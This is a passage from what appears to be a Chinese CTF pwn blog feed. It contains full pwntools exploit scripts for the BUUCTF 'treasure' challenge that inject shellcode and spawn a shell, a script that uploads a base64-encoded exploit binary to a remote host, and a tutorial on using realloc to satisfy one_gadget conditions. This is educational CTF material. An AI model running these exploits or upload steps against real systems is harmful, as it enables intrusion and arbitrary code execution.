<p>但是这个脚本我们是无法在远程的环境上编写并编译的，所以我们得在本地编译好，然后用 <code>python</code> 脚本将 <code>exp</code> 进行 <code>base64</code> 编码，然后上传到远程环境。</p>
<p><code>python</code> 脚本如下：</p>
<p>这个依然是官方的 <code>python</code> 脚本。作用就是将 <code>exp</code> 上传到远端环境中。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./boot.sh&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;61.147.171.105&quot;</span>,<span class="number">61265</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exec_cmd</span>(<span class="params">cmd</span>):</span><br><span class="line">    io.sendline(cmd)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;# &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>(<span class="params">exp</span>):</span><br><span class="line">    p = log.progress(<span class="string">&quot;exp&quot;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./&quot;</span>+exp, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    encoded = base64.b64encode(data)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;# &quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(encoded), <span class="number">600</span>):</span><br><span class="line">        p.status(<span class="string">&quot;%d / %d&quot;</span> % (i, <span class="built_in">len</span>(encoded)))</span><br><span class="line">        exec_cmd(<span class="string">&quot;echo \&quot;%s\&quot; &gt;&gt; /tmp/benc&quot;</span> % (encoded[i:i+<span class="number">600</span>]))</span><br><span class="line"></span><br><span class="line">    exec_cmd(<span class="string">&quot;cat /tmp/benc | base64 -d &gt; /tmp/exp&quot;</span>)</span><br><span class="line">    exec_cmd(<span class="string">&quot;chmod +x /tmp/exp&quot;</span>)</span><br><span class="line">upload(<span class="string">&#x27;exp&#x27;</span>)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301131842540.png" alt="image-20230113184223347"></p>
<h2 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h2><p><a href="https://xia0ji233.pro/2023/01/01/Nepnep-CatCTF2022/#injection2-0%F0%9F%92%89">攻防世界 x Nepnep x CATCTF 2022 Nepnep战队官方WP | xia0ji233’s blog</a></p>
]]></content>
      <categories>
        <category>赛题WP</category>
      </categories>
      <tags>
        <tag>栈迁移</tag>
        <tag>沙箱</tag>
        <tag>C++</tag>
        <tag>栈溢出</tag>
        <tag>进程注入</tag>
        <tag>上传脚本</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF_鹏城杯_2018_treasure</title>
    <url>/posts/7bda138.html</url>
    <content><![CDATA[<p>这道题不知道我这个方法算不算非预期解，不过做出来之后看其他师傅们的wp感觉自己的方法弱爆了，下面简单分析一下这道题。</p>
<span id="more"></span>

<h2 id="保护策略："><a href="#保护策略：" class="headerlink" title="保护策略："></a>保护策略：</h2><img src="https://s2.loli.net/2022/07/22/yK5XANsVgEDZTJU.png" alt="image-20220722114127886" style="zoom:50%;" />

<h2 id="程序分析："><a href="#程序分析：" class="headerlink" title="程序分析："></a>程序分析：</h2><img src="https://s2.loli.net/2022/07/22/NJDx2pEBTPcZl5X.png" alt="image-20220722114157199" style="zoom:50%;" />

<p>这个函数就是出题人准备了一个shellcode，然后放到了一个随机的位置。但是这个shellcode放到的这个位置是不可执行的… 不知道有啥意义，反正我感觉这道题跟这个函数没关系。</p>
<img src="https://s2.loli.net/2022/07/22/yA34E6fTnPr19DF.png" alt="image-20220722114346426" style="zoom:50%;" />

<p>这个函数就是可以输入一个9字节的内容，然后将其执行。只要程序不崩溃，并且不执行break。那就可以无限重复这些代码。</p>
<h2 id="大致思路"><a href="#大致思路" class="headerlink" title="大致思路"></a>大致思路</h2><p>由于出题人给的那个shellcode也执行不了，所以就不考虑那里了。然后每次只能执行九字节的数据，直接写shellcode肯定是不行的。我们先到函数指针那里调试，看看是什么情况。</p>
<p><img src="https://s2.loli.net/2022/07/22/9bEw5lF6gLaPjyr.png" alt="image-20220722114806036"></p>
<p>调试发现，存在可写同时还可执行的内存只有0x7fffff7ff6000这一段内存。那么思路肯定是把shellcode写到这片内存，然后将其执行。</p>
<p>但是貌似没法用函数来写shellcode，然后我就考虑自己编写一段汇编，然后将shellcode的机器码一字节一字节写到这片内存。同时观察此时的寄存器rdx(如下图)，发现rdx的值就是可执行内存的地址。</p>
<p><img src="https://s2.loli.net/2022/07/22/lhXn4tUZoL7qsxc.png" alt="image-20220722115221760"></p>
<p>然后我编写了下面这段汇编代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">push 0x48</span><br><span class="line">pop [rdx+0x20]</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>

<p>这段汇编的意思就是说把0x48写到rdx+0x20指向的内存，然后执行ret指令。这个0x48也就是shellcode的机器码中的一个字节，然后不断循环，下次写入到[rdx+0x21]，依次类推。之所以我放到0x20处，是为了不破坏我们写入的九字节数据(只要不破坏九个字节的数据，偏移是多少都可以)</p>
<p>shellcode的机器码如下  <a href="https://defuse.ca/online-x86-assembler.htm#disassembly">在线汇编转机器码的网站</a></p>
<p><img src="https://s2.loli.net/2022/07/22/WfsnwubMAOcr2zC.png" alt="image-20220722115739583"></p>
<p>然后就用上面的方法把这个shellcode一字节一字节的写入。</p>
<p>举个例子，第一次执行push 0x48;pop [rdx+0x20];ret的时候，就转成对应机器码</p>
<img src="https://s2.loli.net/2022/07/22/EyP2wMzqDeKXB8p.png" alt="image-20220722115953307" style="zoom:33%;" />

<p>然后payload这么写</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p.sendlineafter(<span class="string">&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;start!!!!&#x27;</span>,<span class="string">b&#x27;\x6A\x48\x8F\x42\x20\xC3&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>依次类推，将shellcode一个字节一个字节写入即可。</p>
<p>最后将shellcode写完的时候，执行下面的汇编指令(转成机器码)跳转到shellcode上即可。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">add rdx,0x20</span><br><span class="line">jmp rdx</span><br></pre></td></tr></table></figure>

<p>效果如下，此时jmp rdx就跳转到了我布置的shellcode上了。</p>
<p><img src="https://s2.loli.net/2022/07/22/MxuyOCkr4jpRtPq.png" alt="image-20220722120527335"></p>
<h2 id="EXP："><a href="#EXP：" class="headerlink" title="EXP："></a>EXP：</h2><p><a href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">tools源码</a></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc= load(<span class="string">&quot;a&quot;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;node4.buuoj.cn&#x27;,29220)</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;start!!!!&#x27;</span>,<span class="string">b&#x27;\x6A\x48\x8F\x42\x20\xC3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;start!!!!&#x27;</span>,<span class="string">b&#x27;\x6A\x31\x58\x48\x89\x42\x21\xC3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;start!!!!&#x27;</span>,<span class="string">b&#x27;\x68\xC0\x00\x00\x00\x8F\x42\x22\xC3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;start!!!!&#x27;</span>,<span class="string">b&#x27;\x6A\x6A\x8F\x42\x23\xC3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;start!!!!&#x27;</span>,<span class="string">b&#x27;\x6A\x3B\x8F\x42\x24\xC3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;start!!!!&#x27;</span>,<span class="string">b&#x27;\x6A\x58\x8F\x42\x25\xC3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;start!!!!&#x27;</span>,<span class="string">b&#x27;\x6A\x48\x8F\x42\x26\xC3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;start!!!!&#x27;</span>,<span class="string">b&#x27;\x6A\x31\x8F\x42\x27\xC3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;start!!!!&#x27;</span>,<span class="string">b&#x27;\x68\xFF\x00\x00\x00\x8F\x42\x28\xC3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;start!!!!&#x27;</span>,<span class="string">b&#x27;\x6A\x48\x8F\x42\x29\xC3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;start!!!!&#x27;</span>,<span class="string">b&#x27;\x68\xBF\x00\x00\x00\x8F\x42\x2A\xC3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;start!!!!&#x27;</span>,<span class="string">b&#x27;\x6A\x2F\x8F\x42\x2B\xC3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;start!!!!&#x27;</span>,<span class="string">b&#x27;\x6A\x62\x8F\x42\x2C\xC3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;start!!!!&#x27;</span>,<span class="string">b&#x27;\x6A\x69\x8F\x42\x2D\xC3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;start!!!!&#x27;</span>,<span class="string">b&#x27;\x6A\x6E\x8F\x42\x2E\xC3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;start!!!!&#x27;</span>,<span class="string">b&#x27;\x6A\x2F\x8F\x42\x2F\xC3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;start!!!!&#x27;</span>,<span class="string">b&#x27;\x6A\x73\x8F\x42\x30\xC3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;start!!!!&#x27;</span>,<span class="string">b&#x27;\x6A\x68\x8F\x42\x31\xC3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;start!!!!&#x27;</span>,<span class="string">b&#x27;\x6A\x00\x8F\x42\x32\xC3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;start!!!!&#x27;</span>,<span class="string">b&#x27;\x6A\x57\x8F\x42\x33\xC3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;start!!!!&#x27;</span>,<span class="string">b&#x27;\x6A\x54\x8F\x42\x34\xC3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;start!!!!&#x27;</span>,<span class="string">b&#x27;\x6A\x5F\x8F\x42\x35\xC3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;start!!!!&#x27;</span>,<span class="string">b&#x27;\x6A\x48\x8F\x42\x36\xC3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;start!!!!&#x27;</span>,<span class="string">b&#x27;\x6A\x31\x8F\x42\x37\xC3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;start!!!!&#x27;</span>,<span class="string">b&#x27;\x68\xF6\x00\x00\x00\x8F\x42\x38\xC3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;start!!!!&#x27;</span>,<span class="string">b&#x27;\x6A\x48\x8F\x42\x39\xC3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;start!!!!&#x27;</span>,<span class="string">b&#x27;\x6A\x31\x8F\x42\x3A\xC3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;start!!!!&#x27;</span>,<span class="string">b&#x27;\x68\xD2\x00\x00\x00\x8F\x42\x3B\xC3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;start!!!!&#x27;</span>,<span class="string">b&#x27;\x6A\x0F\x8F\x42\x3C\xC3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;start!!!!&#x27;</span>,<span class="string">b&#x27;\x6A\x05\x8F\x42\x3D\xC3&#x27;</span>)</span><br><span class="line"><span class="comment">#debug(p,0x400AB6)</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;start!!!!&#x27;</span>,<span class="string">b&#x27;\x48\x83\xC2\x20\xFF\xE2&#x27;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<img src="https://s2.loli.net/2022/07/22/ygNzXT6w8vYr3JL.png" alt="image-20220722120733156" style="zoom: 50%;" />



<h2 id="更简单的思路"><a href="#更简单的思路" class="headerlink" title="更简单的思路"></a>更简单的思路</h2><p>做出来之后，我去看了其他师傅的wp，发现roderick师傅的思路非常简单和巧妙。<a href="https://www.cnblogs.com/LynneHuan/p/15229732.html">roderick师傅的这篇文章</a></p>
<p>用到了xchg这个指令（这个指令的作用就是交换两个寄存器的值）</p>
<p>因为在执行call rdx的时候，rdx就是可执行内存的地址，让它跟rsi寄存器互换一下。由于rax寄存器正好是0，所以执行syscall就相当于read函数往可执行区域去写数据。效果如下图</p>
<p><img src="https://s2.loli.net/2022/07/22/284NKCPMorVikBR.png" alt="image-20220722121138002"></p>
<p>这样就可以直接往可执行的这片内存写入数据了。(我又让rsi加了9，这样就直接写到了紧接着syscall指令的地方)这样syscall执行完，直接就执行我写入的数据了 效果如下图</p>
<img src="https://s2.loli.net/2022/07/22/AtRf8Xl1MgN9E3e.png" alt="image-20220722121403173" style="zoom:50%;" />

<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP:"></a>EXP:</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc= load(<span class="string">&quot;a&quot;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29220</span>)</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#debug(p,0x400AB6)</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;start!!!!&#x27;</span>,<span class="string">b&#x27;\x48\x87\xF2\x48\x83\xC6\x09\x0F\x05&#x27;</span>)</span><br><span class="line">p.sendline(shellcode_store(<span class="string">&#x27;orw_64&#x27;</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2022/07/22/Y2tCNxBViLodyRb.png" alt="image-20220722121508169"></p>
]]></content>
      <categories>
        <category>buu刷题</category>
      </categories>
      <tags>
        <tag>shellcode</tag>
      </tags>
  </entry>
  <entry>
    <title>使用realloc函数来调整栈帧让one_gadget生效</title>
    <url>/posts/f7fd9662.html</url>
    <content><![CDATA[<p>使用one_gadget的时候，必须要满足一定条件，如果所有one_gadget都没有满足条件，那么我们可以使用realloc函数来调整栈帧打one_gadget。<strong>本文以2.23的libc版本中的realloc函数举例说明使用realloc函数是如何调整栈帧打one_gadget的，但是在不同的libc版本中，realloc函数的具体汇编代码也不同，就导致了从在不同libc版本中的realloc函数的相同偏移处开始执行，最终调整的栈帧也是不同的，因此在实际的做题中，去一个一个尝试偏移会比计算出能使one_gadget生效的realloc函数偏移更快。</strong></p>
<span id="more"></span>

<h2 id="怎么看one-gadget是否满足条件？"><a href="#怎么看one-gadget是否满足条件？" class="headerlink" title="怎么看one_gadget是否满足条件？"></a>怎么看one_gadget是否满足条件？</h2><p>下图是one_gadget的使用条件</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012012828.png"></p>
<p>然后下图此时的__malloc_hook已经被修改为one_gadget了，并且此时准备执行calloc函数（这里先理解成malloc就行，利用手法是一样的），然后si单步进去（如下图）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012012829.png"></p>
<p>然后单步到这里（如下图），此时就执行了__malloc_hook中的内容，也就是将要执行我们的one_gadget</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012012830.png"></p>
<p>然后我们再si进去（如下图）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012012831.png"></p>
<p>然后我们看此时的是否满足one_gadget的执行条件</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012012832.png"></p>
<p>先看rax寄存器的值（如下图），发现不为0（NULL)，因此第一个one_gadget不能用</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012012833.png"></p>
<p>然后看[rsp+0x30]的值(如下图)，发现也不为0(NULL)，因此第二个也不能用</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012012834.png"></p>
<p>然后依次类推，发现[rsp+0x50]和[rsp+0x70]的地方也都不为0（如下图）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012012835.png"></p>
<p>至此，四个one_gadget全部失效。因此我们要用realloc函数来调整栈帧，从而使one_gadget能够使用。</p>
<h2 id="为什么我们用realloc函数调整栈帧？"><a href="#为什么我们用realloc函数调整栈帧？" class="headerlink" title="为什么我们用realloc函数调整栈帧？"></a>为什么我们用realloc函数调整栈帧？</h2><p>我认为原因有两个<strong>（根本原因是第一个）</strong>：</p>
<blockquote>
<p> 第一、realloc函数存在一个__realloc_hook（执行realloc的时候会判断__realloc_hook是否为空，如果不为空，则执行__realloc_hook指向的内容），同时__realloc_hook和__malloc_hook的地址是挨着的（如下图），这就意味着我们覆写__malloc_hook的时候可以顺便控制__realloc_hook。<strong>因此我们把__malloc_hook改成__realloc_hook然后__realloc_hook写入one_gaget，最后依然可以执行one_gadget</strong></p>
</blockquote>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012012836.png"></p>
<blockquote>
<p>第二、realloc函数中有大量的push指令（如下图）（在执行__realloc_hook之前），因此我们将realloc函数的地址加上一定的偏移，就可以选择去执行一定量的push指令，从而抬高栈帧（我指的抬高栈帧是栈帧又向着低地址增长了）。这样rsp增加了之后，我们就可以控制例如rsp+0x30，让其内存值正好落在0处。</p>
</blockquote>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012012837.png"></p>
<h2 id="具体怎么用realloc函数调整栈帧"><a href="#具体怎么用realloc函数调整栈帧" class="headerlink" title="具体怎么用realloc函数调整栈帧"></a>具体怎么用realloc函数调整栈帧</h2><p>首先看一下上面的图片，其中有6个push指令和一个sub rsp,0x38指令。<strong>这些指令都是把栈帧抬高（我说的抬高是指栈向低地址增长），然后抬高栈帧之后去执行one_gadget。(以[rsp+0x30]这个条件为例)这就意味着我们必须去[rsp+0x30]的上面(也就是低地址处)寻找0</strong> (这句话您细品)</p>
<p>然后将realloc函数地址加上不同的偏移，就可以执行一定数量的push和sub rsp,0x38指令(因为可以跳过一定个数的指令)。先考虑一下直接从0x846c0这个地址（先忽略PIE造成的影响）开始执行。这样到执行one_gadget之前有6个push和一个sub rsp,0x38指令，这将栈帧抬高了0x68(0x8<em>6+0x38),但是别忘了由于多call了一次(call了realloc函数，然后又去call one_gadget，但是原本只有一次call one_gadget)，*<em>因此多执行了一次压栈指令，所以最终直接执行realloc函数，栈帧抬高了0x70字节（就是将原本的rsp变成了rsp-0x70）</em></em></p>
<p>如果执行realloc函数栈帧最少抬高多少呢？</p>
<blockquote>
<p>最少肯定是只抬高八字节(也就是仅仅多了一次call时执行的压栈指令)，<strong>这里我们先不考虑这种情况，假设必须要执行一次对栈操作指令，那么执行一次realloc函数最少应该抬高0x40个字节（sub rsp,0x38让rsp-0x38再加上call时的压栈指令）</strong></p>
</blockquote>
<h2 id="结论："><a href="#结论：" class="headerlink" title="结论："></a>结论：</h2><blockquote>
<p><strong>当使用realloc函数调整栈帧时，我们可以将rsp增加（这个增加指的是栈向低地址增长）的范围控制在 0x40与0x70之间</strong>(如果不考虑最低0x8字节的话)，<strong>为了满足one_gadget的条件，只要rsp-0x40与rsp-0x70之间存在一个为0的内存单元，那么我们就可以控制realloc函数中push的数量来满足条件（控制的方法就是将realloc函数的地址加上偏移来跳过一定量的push指令）。</strong></p>
<p>以[rsp+0x30]&#x3D;NULl这个条件为例，加上rsp-0x40与rsp-0x70这个范围。也就是说最后要在rsp-0x10与rsp-0x40找一块值为0成内存单元。</p>
</blockquote>
<h2 id="举例演示："><a href="#举例演示：" class="headerlink" title="举例演示："></a>举例演示：</h2><p>现在我已经发现四个one_gadget全部失效，然后我想看看其中一个one_gadget [rsp+0x30]经过调整栈帧后能否使用，先去看rsp-0x10与rsp-0x40 这个范围是否存在值为0的内存。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012012838.png"></p>
<p>这个0的地址是0x7ffc5f3b9ca0，如果将realloc函数对栈操作指令全部执行完的话，那么rsp-0x30的位置就是0x7ffc5f3b9c98，我们少执行一个push的话，那么rsp-0x30就会变成0x7ffc5f3b9ca0。因此判断出来我们写入realloc地址+2(push指令长度为2字节)就可以让one_gadget生效（因为跳过了一次push指令）</p>
<p>下图为realloc调整栈帧处的exp。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012012839.png"></p>
<p>可以看见下图已经说明这个one_gadget已经生效，我们获取了shell</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012012840.png"></p>
<h2 id="one-gadget的条件是获取shell的充分条件"><a href="#one-gadget的条件是获取shell的充分条件" class="headerlink" title="one_gadget的条件是获取shell的充分条件"></a>one_gadget的条件是获取shell的充分条件</h2><p>如果这道题你已经掌握了上面介绍realloc调整栈帧的话，其实就已经是结束了。不过在最后我又学了一个更重要的细节。<strong>还是上面的脚本最后如果实际调一下的话，发现__malloc_hook里写realloc+1或者realloc+3或者直接写realloc地址都可以获取shell。</strong>（如下图）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012012841.png"></p>
<p>这是为什么？这是否意味着上面我们的结论有误？</p>
<p>探究一下便知。首先调试一下__malloc_hook里写入realloc函数的地址 这个情况。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012012842.png"></p>
<p>发现[rsp+0x30]处居然不为0，但是却能成功获取shell（如下）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012012843.png"></p>
<p>想解释这个原因，还要从execve函数下手。</p>
<p>通常我们认为获取shell就要写执行execve(“&#x2F;bin&#x2F;sh”,0,0)才可以，但是后两个参数真的一定要为0么？</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012012844.png"></p>
<p>它这段第一句的意思就是说argv是个传递新程序的字符串数组，说实话这句我理解也不是太深，但是能获取到两个信息。<strong>首先这个argv数组里面装的是指针（因为实际上是指针指向了字符数组(字符串使用字符串数组进行存储)的地址），其次这个数组要以NULL结尾，envp参数也是一样。</strong></p>
<p><strong>也就是说只要argv这个地方里面放了个指针并且是NULL结尾，至于指针指向的是不是字符串已经无所谓了，而此时的情况就是argv里面放了个指针，并且是NULL结尾(如下图)</strong></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012012845.png"></p>
